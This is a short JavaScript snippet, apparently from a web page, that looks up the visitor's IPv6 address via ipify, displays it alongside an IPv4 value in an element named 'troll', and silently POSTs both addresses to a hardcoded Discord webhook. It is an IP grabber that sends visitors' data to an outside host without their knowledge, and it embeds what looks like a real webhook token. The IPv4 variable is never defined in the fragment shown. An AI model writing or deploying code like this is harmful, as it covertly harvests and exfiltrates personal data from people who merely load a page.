fetch('https://api6.ipify.org/?format=json')
  .then(response => response.json())
  .then(data => {
    const IPv6 = data.ip;

    
    document.getElementById('troll').innerHTML = "IPv4: " + IPv4 + "<br>IPv6: " + IPv6;

    
    const webhookUrl = 'https://discord.com/api/webhooks/1230673184089440327/xxYOmaRr1PlwDR9MS1RZXFp01Jgf_IaxzawR4xiKHnptKVDusa4Anb7A6tr8l5O7lhKQ';
    const message = `IPv4: ${IPv4}\nIPv6: ${IPv6}`;
    
    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        content: message
      })
    });
  });
